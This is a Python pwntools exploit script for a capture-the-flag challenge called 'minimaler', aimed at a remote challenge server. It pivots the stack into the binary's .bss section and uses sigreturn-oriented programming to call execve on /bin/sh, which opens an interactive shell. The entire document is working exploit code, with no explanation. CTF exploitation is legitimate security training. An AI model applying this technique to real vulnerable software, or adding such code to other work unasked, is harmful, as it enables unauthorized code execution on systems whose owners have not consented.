from pwn import *
import sys

elf = ELF("vuln_patched")
libc = ELF("libc.so.6")

# io = process(elf.path)
io = remote("minimaler.chal.imaginaryctf.org", 42043)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io, gdbscript='b *0x401044')

stack_pivot_addr = elf.bss() + 0x400
binsh_addr = stack_pivot_addr - 0x10
inc_esi_addr = 0x401115

# stack pivot
p = b'A' * 0x8
p += p64(stack_pivot_addr - 8)
p += p64(elf.sym["main"] + 12)
io.send(p)

sleep(1)

# srop
p = b'/bin/sh\x00'
p += p64(stack_pivot_addr)
p += p64(elf.sym["syscall"])
p += p64(elf.sym["syscall"])
p += p64(elf.sym["syscall"])
for i in range(15 + 0x80):
    p += p64(inc_esi_addr)
p += p64(elf.sym["syscall"])
p += p64(elf.sym["syscall"])

s = SigreturnFrame()
s.rip = elf.sym["syscall"]
s.rdi = 0x3b
s.rsi = binsh_addr
s.rdx = 0x0
s.rcx = 0x0
s.rsp = stack_pivot_addr
s.rbp =0x0

p += bytes(s)


io.send(p)

# sleep(1)

# p = b'/bin/sh\x00'
# p += p64(0xf + 8)
# p += p64(elf.sym["main"] + 12)
# io.send(p)


io.interactive()